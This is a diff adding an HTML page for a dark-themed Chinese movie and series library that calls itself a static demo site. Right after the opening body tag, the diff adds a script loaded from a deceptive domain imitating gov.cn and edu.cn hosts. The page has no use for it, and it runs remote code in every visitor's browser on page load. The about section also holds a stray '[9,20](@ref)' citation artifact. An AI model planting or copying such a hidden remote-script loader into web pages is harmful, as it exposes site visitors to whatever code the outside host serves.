@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>高清影视 - 影院级高清片库 | gaoqingyingshi-h5.github.io</title>
+<meta name="description" content="高清影视（gaoqingyingshi-h5.github.io）影院级高清片库：高清电影、剧集、综艺动漫、4K/杜比/HDR 专区，深色银幕风、移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="高清影视,gaoqingyingshi-h5,1080P,4K,杜比,HDR,影院级,电影片库,剧集片库" />
+<link rel="canonical" href="https://gaoqingyingshi-h5.github.io/" />
+<style>
+:root{
+  --bg:#0A0B10;--bg2:#101218;--blue:#1F6FEB;--silver:#C7CBD1;--warm:#F5F0E6;
+  --red:#E23636;--gray:#8A90A2;--glass:rgba(255,255,255,.045);--line:rgba(31,111,235,.28);--maxw:1140px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--warm);line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+.screen-bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.screen-bg::before{content:"";position:absolute;top:-12%;left:8%;width:480px;height:480px;background:radial-gradient(circle,rgba(31,111,235,.18),transparent 70%);animation:proj 9s ease-in-out infinite}
+.screen-bg::after{content:"";position:absolute;bottom:-14%;right:6%;width:480px;height:480px;background:radial-gradient(circle,rgba(245,240,230,.06),transparent 70%);animation:proj 11s ease-in-out infinite reverse}
+@keyframes proj{0%,100%{transform:scale(1);opacity:.55}50%{transform:scale(1.12);opacity:1}}
+
+header.site{position:sticky;top:0;z-index:60;background:rgba(10,11,16,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;gap:12px;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-weight:900;font-size:18px}
+.logo-icon{width:36px;height:36px;border-radius:9px;background:linear-gradient(135deg,#101218,var(--blue));
+  display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 18px rgba(31,111,235,.4);border:1px solid rgba(199,203,209,.25)}
+.logo small{display:block;font-size:9px;color:var(--gray);font-weight:500}
+.menu{margin-left:auto;display:flex;gap:4px}
+.menu a{padding:7px 14px;border-radius:8px;font-size:13px;color:var(--gray);transition:.2s;font-weight:600}
+.menu a:hover{background:var(--glass);color:var(--blue)}
+.search{display:flex;gap:6px}
+.search input{width:130px;padding:8px 14px;border-radius:8px;border:1px solid var(--line);background:var(--glass);color:var(--warm);outline:none;font-size:13px}
+.search button{border:0;padding:8px 14px;border-radius:8px;cursor:pointer;font-weight:800;background:var(--red);color:#fff;font-size:13px}
+.burger{display:none;margin-left:auto;background:var(--glass);border:1px solid var(--line);color:var(--warm);border-radius:8px;padding:6px 10px;font-size:16px}
+
+.hero{position:relative;z-index:1;margin:24px 0;border-radius:28px;overflow:hidden;background:
+  radial-gradient(120% 90% at 16% 6%,rgba(31,111,235,.22),transparent 52%),
+  radial-gradient(120% 90% at 90% 96%,rgba(226,54,54,.10),transparent 52%),
+  var(--bg2);
+  min-height:380px;display:flex;align-items:center;padding:46px 40px}
+.hero::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,.012) 3px,rgba(255,255,255,.012) 6px)}
+.hero-body{position:relative;z-index:2;max-width:600px}
+.badge{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:999px;background:rgba(199,203,209,.1);color:var(--silver);font-size:11px;font-weight:800;letter-spacing:2px;margin-bottom:14px;border:1px solid rgba(199,203,209,.28)}
+.hero h1{font-size:40px;margin:0 0 10px;line-height:1.14}
+.hero h1 em{font-style:normal;color:#9CC2FF}
+.hero p{color:var(--gray);font-size:15px;margin:0 0 22px}
+.cta{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.play{display:inline-flex;align-items:center;gap:10px;padding:11px 22px;border-radius:999px;background:var(--red);color:#fff;font-weight:900;border:0;cursor:pointer;font-size:14px;box-shadow:0 10px 30px rgba(226,54,54,.35)}
+.play .tri{width:0;height:0;border-left:12px solid #fff;border-top:8px solid transparent;border-bottom:8px solid transparent}
+.btn-line{background:transparent;border:2px solid var(--blue);color:#9CC2FF;padding:10px 22px;border-radius:999px;font-weight:800;cursor:pointer;font-size:13px}
+.btn-line:hover{background:rgba(31,111,235,.1)}
+.bars{display:flex;gap:6px;margin-top:18px;flex-wrap:wrap}
+.bar{font-size:11px;font-weight:800;padding:5px 12px;border-radius:999px;border:1px solid var(--line);color:var(--silver)}
+.bar.hot{color:#fff;background:rgba(31,111,235,.25);border-color:var(--blue)}
+.bar.dolby{color:#0A0B10;background:var(--silver)}
+.bar.hdr{color:#0A0B10;background:#FFC857}
+
+.section{padding:36px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:22px;flex-wrap:wrap}
+.sec-head h2{font-size:22px;margin:0}
+.sec-head h2::before{content:"▣ ";}
+.sec-head h2 .b{color:#9CC2FF}
+.sec-head h2 .s{color:var(--silver)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--red);font-size:12px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{border-radius:18px;overflow:hidden;background:var(--glass);border:1px solid var(--line);transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--blue);box-shadow:0 14px 36px rgba(31,111,235,.2)}
+.cover{aspect-ratio:16/10;border-radius:16px 16px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(150deg,#0a1f3a,#1F6FEB)}
+.card:nth-child(2) .cover{background:linear-gradient(150deg,#2a0f12,#E23636)}
+.card:nth-child(3) .cover{background:linear-gradient(150deg,#1c1f24,#5b6472)}
+.card:nth-child(4) .cover{background:linear-gradient(150deg,#241a06,#FFC857)}
+.card:nth-child(5) .cover{background:linear-gradient(150deg,#071a17,#1FB6A6)}
+.card:nth-child(6) .cover{background:linear-gradient(150deg,#1a1030,#8A7BFF)}
+.card:nth-child(7) .cover{background:linear-gradient(150deg,#2a1606,#FF8A3D)}
+.card:nth-child(8) .cover{background:linear-gradient(150deg,#101418,#9AA7BD)}
+.q{font-size:10px;font-weight:900;padding:3px 9px;border-radius:6px;background:rgba(10,11,16,.66);color:#fff;border:1px solid rgba(255,255,255,.25)}
+.q.k4{background:var(--silver);color:#0A0B10}
+.q.hdr{background:#FFC857;color:#0A0B10}
+.q.dolby{background:var(--blue);color:#fff}
+.cover h4{margin:auto 0 0;font-size:15px;color:#fff;text-shadow:0 2px 10px rgba(0,0,0,.6);width:100%}
+.body{padding:12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:999px;background:rgba(255,255,255,.06);color:var(--gray);font-weight:600}
+.body p{margin:0;font-size:11px;color:var(--gray);line-height:1.5}
+
+.zones{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.zone{border-radius:16px;padding:18px;background:linear-gradient(160deg,var(--glass),rgba(31,111,235,.05));border:1px solid var(--line);transition:.25s}
+.zone:hover{transform:translateY(-3px);border-color:var(--silver)}
+.zone .ic{font-size:24px}
+.zone h3{font-size:14px;margin:8px 0 3px}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px}
+.fbtn{font-size:12px;font-weight:700;padding:7px 16px;border-radius:999px;border:1px solid var(--line);background:var(--glass);color:var(--silver);cursor:pointer}
+.fbtn.on{background:var(--blue);color:#fff;border-color:var(--blue)}
+
+.premium{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.pr{border-radius:20px;padding:24px;background:radial-gradient(120% 80% at 20% 0%,rgba(31,111,235,.18),transparent 60%),var(--bg2);border:1px solid var(--line)}
+.pr .tag{font-size:11px;font-weight:900;padding:4px 12px;border-radius:999px;background:var(--silver);color:#0A0B10}
+.pr h3{font-size:18px;margin:12px 0 6px}
+.pr p{font-size:12px;color:var(--gray);margin:0 0 14px}
+.pr ul{margin:0;padding-left:18px;color:var(--silver);font-size:12px;line-height:1.9}
+
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:20px}
+.about-card{border-radius:22px;padding:24px;background:var(--glass);border:1px solid var(--line)}
+.about-card h3{font-size:18px;margin:0 0 12px}
+.about-card h3::before{content:"🎬 ";}
+.about-card p,.about-card li{font-size:13px;color:var(--gray);line-height:1.8}
+.about-card ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:12px;margin-top:16px}
+.stat{flex:1;text-align:center;padding:14px;border-radius:16px;background:rgba(31,111,235,.08);border:1px solid var(--line)}
+.stat b{display:block;font-size:20px;color:#9CC2FF}
+.stat span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid var(--line);padding:28px 0 44px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1}
+footer.site a{color:var(--blue)}
+code{background:var(--bg2);border:1px solid var(--line);padding:2px 8px;border-radius:6px;color:var(--warm);font-size:11px;font-family:"Courier New",monospace}
+
+@media(max-width:980px){.grid,.zones{grid-template-columns:repeat(2,1fr)}.premium{grid-template-columns:1fr}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:10px 16px;gap:4px}
+  .menu.open{display:flex}.burger{display:block}.search input{width:90px}.hero h1{font-size:26px}
+  .grid,.zones{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="screen-bg"></div>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">
+      <div class="logo-icon">🎬</div>
+      <div>高清影视<small>gaoqingyingshi-h5.github.io</small></div>
+    </div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#movie">高清电影</a>
+      <a href="#series">剧集片库</a>
+      <a href="#va">综艺动漫</a>
+      <a href="#premium">4K·杜比</a>
+      <a href="#about">关于高清</a>
+    </nav>
+    <div class="search">
+      <input type="text" placeholder="片名 / 类型 / 地区" aria-label="搜索" />
+      <button onclick="alert('演示站：搜索用 # 占位')">搜</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <div class="hero-body">
+      <div class="badge">● CINEMA GRADE · 影院级放映</div>
+      <h1>高清影视，<br/><em>把银幕擦干净再放片</em></h1>
+      <p>电影、剧集、综艺、动漫按画质与片库组织。1080P 起步，4K / HDR / 杜比音效单独成厅，深色银幕风，像在家里开私人放映室。</p>
+      <div class="cta">
+        <button class="play" onclick="location.href='#movie'"><span class="tri"></span> 开播正片</button>
+        <button class="btn-line" onclick="location.href='#premium'">进 4K·杜比厅</button>
+      </div>
+      <div class="bars">
+        <span class="bar hot">1080P 全高清</span>
+        <span class="bar k4">4K 超清</span>
+        <span class="bar hdr">HDR 广色域</span>
+        <span class="bar dolby">Dolby Audio</span>
+        <span class="bar">Remux 原盘</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="movie">
+    <div class="sec-head"><h2><span class="b">高清</span>电影</h2><span>HD Movies</span><a class="more" href="#">更多 #</a></div>
+    <div class="filter">
+      <span class="fbtn on">全部</span><span class="fbtn">动作</span><span class="fbtn">科幻</span><span class="fbtn">剧情</span><span class="fbtn">悬疑</span><span class="fbtn">动画</span><span class="fbtn">经典</span>
+    </div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="q k4">4K</span><h4>沙丘2</h4></div><div class="body"><div class="tags"><span>科幻</span><span>史诗</span><span>沙暴</span></div><p>沙漠颗粒、沙虫鳞片、飞船尾焰，4K 下像在看胶片重制。</p></div></div>
+      <div class="card"><div class="cover"><span class="q hdr">HDR</span><h4>奥本海默</h4></div><div class="body"><div class="tags"><span>传记</span><span>历史</span><span>核爆</span></div><p>白光、火球、黑白交叉，HDR 把恐惧拍成颜色。</p></div></div>
+      <div class="card"><div class="cover"><span class="q">1080P</span><h4>盗梦空间</h4></div><div class="body"><div class="tags"><span>烧脑</span><span>诺兰</span><span>经典</span></div><p>城市折叠、走廊失重，高清重看仍是教科书。</p></div></div>
+      <div class="card"><div class="cover"><span class="q k4">4K</span><h4>星际穿越</h4></div><div class="body"><div class="tags"><span>科幻</span><span>亲情</span><span>黑洞</span></div><p>玉米地、冰云、五维书架，4K+杜比才是完整版。</p></div></div>
+      <div class="card"><div class="cover"><span class="q">1080P</span><h4>漫长的季节</h4></div><div class="body"><div class="tags"><span>悬疑</span><span>东北</span><span>神剧</span></div><p>蒸汽、旧校服、绿皮火车，高清里全是时间。</p></div></div>
+      <div class="card"><div class="cover"><span class="q hdr">HDR</span><h4>蜘蛛侠：纵横宇宙</h4></div><div class="body"><div class="tags"><span>动画</span><span>漫画</span><span>多元</span></div><p>每一帧海报墙，HDR 让油墨和荧光同时发光。</p></div></div>
+      <div class="card"><div class="cover"><span class="q">1080P</span><h4>孤注一掷</h4></div><div class="body"><div class="tags"><span>反诈</span><span>现实</span><span>悬疑</span></div><p>缅北白天和深夜两种脸色，高清更扎心。</p></div></div>
+      <div class="card"><div class="cover"><span class="q k4">4K</span><h4>肖申克的救赎</h4></div><div class="body"><div class="tags"><span>经典</span><span>自由</span><span>修复</span></div><p>老片 4K 修复，雨里张开双臂那一下还是炸。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="sec-head"><h2><span class="s">片库</span>分区</h2><span>Library Zones</span></div>
+    <div class="zones">
+      <div class="zone"><div class="ic">🎬</div><h3>电影厅</h3><p>新片 / 经典 / 导演剪辑 / 修复版</p></div>
+      <div class="zone"><div class="ic">📺</div><h3>剧集库</h3><p>美剧 / 韩剧 / 国剧 / 日剧 / 泰剧</p></div>
+      <div class="zone"><div class="ic">🎤</div><h3>综艺动漫</h3><p>音综 / 新番 / 国漫 / 纪录片</p></div>
+      <div class="zone"><div class="ic">🗂️</div><h3>按维度翻</h3><p>地区 / 年代 / 奖项 / 类型</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="series">
+    <div class="sec-head"><h2><span class="b">剧集</span>片库</h2><span>HD Series</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="q k4">4K</span><h4>权力的游戏</h4></div><div class="body"><div class="tags"><span>奇幻</span><span>战争</span><span>大制作</span></div><p>临冬城雪、龙焰、黑水河，4K 才配叫史诗。</p></div></div>
+      <div class="card"><div class="cover"><span class="q">1080P</span><h4>我的解放日志</h4></div><div class="body"><div class="tags"><span>韩剧</span><span>治愈</span><span>慢</span></div><p>通勤、下班、便利店，高清里全是社畜呼吸。</p></div></div>
+      <div class="card"><div class="cover"><span class="q hdr">HDR</span><h4>大明王朝1566</h4></div><div class="body"><div class="tags"><span>历史</span><span>权谋</span><span>国剧神作</span></div><p>烛火、朝服、雪夜御道，HDR 把明代拍厚了。</p></div></div>
+      <div class="card"><div class="cover"><span class="q">1080P</span><h4>去他妈的世界</h4></div><div class="body"><div class="tags"><span>英剧</span><span>公路</span><span>黑色青春</span></div><p>两个小孩上路，高清也不掩粗粝。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="va">
+    <div class="sec-head"><h2>综艺 / 动漫</h2><span>Variety & Anime</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="q">1080P</span><h4>歌手2024</h4></div><div class="body"><div class="tags"><span>音综</span><span>真唱</span><span>现场</span></div><p>高清现场版，换气、破音、汗珠都听得见。</p></div></div>
+      <div class="card"><div class="cover"><span class="q k4">4K</span><h4>葬送的芙莉莲</h4></div><div class="body"><div class="tags"><span>新番</span><span>奇幻</span><span>治愈</span></div><p>魔法光、森林雾、白发反光，4K 动漫样本。</p></div></div>
+      <div class="card"><div class="cover"><span class="q hdr">HDR</span><h4>地球脉动3</h4></div><div class="body"><div class="tags"><span>纪录</span><span>自然</span><span>BBC</span></div><p>冰川裂纹、羽毛、瞳孔，HDR 自然片天花板。</p></div></div>
+      <div class="card"><div class="cover"><span class="q">1080P</span><h4>刺客伍六七</h4></div><div class="body"><div class="tags"><span>国漫</span><span>热血</span><span>沙雕</span></div><p>小岛、剪刀、理发店，高清也不丢市井气。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="premium">
+    <div class="sec-head"><h2><span class="b">4K</span> · 杜比 · HDR 专区</h2><span>Premium Theater</span><a class="more" href="#">完整片单 #</a></div>
+    <div class="premium">
+      <div class="pr"><span class="tag">4K ULTRA HD</span><h3>超清厅</h3><p>3840×2160，适合大屏、投影、平板。</p>
+        <ul><li>沙丘2 / 星际穿越 / 奥本海默</li><li>权力游戏 / 地球脉动3</li><li>新番 4K 重制</li></ul></div>
+      <div class="pr"><span class="tag">DOLBY</span><h3>杜比厅</h3><p>环绕声场，雨声、引擎、耳语分三层。</p>
+        <ul><li>盗梦空间 / 信条</li><li>现场音综 / 音乐会</li><li>动作片原声重混</li></ul></div>
+      <div class="pr"><span class="tag">HDR</span><h3>广色域厅</h3><p>黑更黑、火更亮，胶片感拉满。</p>
+        <ul><li>蜘蛛侠：纵横宇宙</li><li>大明王朝1566 修复</li><li>自然纪录 / 夜戏</li></ul></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于高清影视</h2><span>About</span></div>
+    <div class="about">
+      <div class="about-card">
+        <h3>本站是什么？</h3>
+        <p>高清影视（gaoqingyingshi-h5.github.io）是一个影院暗色风的高清片库演示页：不先喊“免费”，先把画质、片库、分类和放映氛围做对。电影、剧集、综艺、动漫按“高清→4K→HDR→杜比”分层，适合做正片厅式导航。</p>
+        <div class="stats">
+          <div class="stat"><b>1080P+</b><span>起步画质</span></div>
+          <div class="stat"><b>6</b><span>栏目</span></div>
+          <div class="stat"><b>100%</b><span>移动端适配</span></div>
+        </div>
+      </div>
+      <div class="about-card">
+        <h3>演示说明</h3>
+        <ul>
+          <li>纯静态单页，无后端、无数据库</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>不提供盗版资源</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整 [9,20](@ref)</li>
+          <li>影院黑 + 银幕蓝 + 胶片银，放映厅质感</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    高清影视 · <a href="https://gaoqingyingshi-h5.github.io/">gaoqingyingshi-h5.github.io</a><br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源。<br/>
+    © 2026 高清影视 Demo · 把银幕擦干净再放片
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+  document.querySelectorAll('.fbtn').forEach(f=>f.onclick=()=>{
+    document.querySelectorAll('.fbtn').forEach(x=>x.classList.remove('on'));
+    f.classList.add('on');
+  });
+</script>
+</body>
+</html>
